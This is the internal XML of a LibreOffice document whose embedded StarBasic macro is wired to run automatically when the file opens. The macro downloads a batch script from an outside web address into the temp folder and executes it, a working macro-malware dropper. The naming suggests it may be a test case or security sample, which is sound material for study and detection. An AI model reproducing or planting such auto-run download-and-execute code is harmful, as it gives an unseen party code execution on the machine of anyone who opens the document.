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meta.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/UCASES_S4_MACR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dom:load" xlink:href="vnd.sun.star.script:Standard.UCASES_S4_MACRO.AutoOpen?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:font-face-decls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left" style:justify-single-word="false" style:writing-mode="lr-tb">
        <style:tab-stops>
          <style:tab-stop style:position="2.7917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document for UCASES S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2:11:56</meta:creation-date>
    <dc:language>en-US</dc:language>
    <dc:date>2026-03-04T08:19:08.770242000</dc:date>
    <meta:editing-cycles>32</meta:editing-cycles>
    <meta:editing-duration>PT2H45M49S</meta:editing-duration>
    <meta:generator>LibreOffice/26.2.1.2$Windows_X86_64 LibreOffice_project/620$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="7" meta:character-count="32" meta:non-whitespace-character-count="26"/>
    <meta:user-defined meta:name="AppVersion">15.0000</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/UCASES_S4_MACRO.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="UCASES_S4_MACRO" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
Option VBASupport 1
Sub Document_Open()
Main
End Sub 

Sub AutoOpen()
Main
End Sub 

Sub Main()
	Dim url, localFile, http, stream, shell, fso
	
	url = "https://do-not-download-again.github.io/script.bat"
	
	Set fso = CreateObject("Scripting.FileSystemObject")
	localFile = fso.GetSpecialFolder(2).Path &amp; "\downloaded_script.bat"
	    
	Set http = CreateObject("MSXML2.XMLHTTP")
	Set shell = CreateObject("WScript.Shell")
	
	http.Open "GET", url, False
	http.Send
	
	If http.Status = 200 Then
	    On Error Resume Next
	    Set stream = CreateObject("ADODB.Stream")
	    stream.Type = 2 
	    stream.Charset = "us-ascii"
	    stream.Open
	    stream.WriteText http.responseText
	    stream.SaveToFile localFile, 2
	    stream.Close
	    On Error GoTo 0
	        
	    shell.Run Chr(34) &amp; localFile &amp; Chr(34), 1, False
	Else
	    MsgBox "Download failed: HTTP " &amp; http.Status
	End If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CASES_S4_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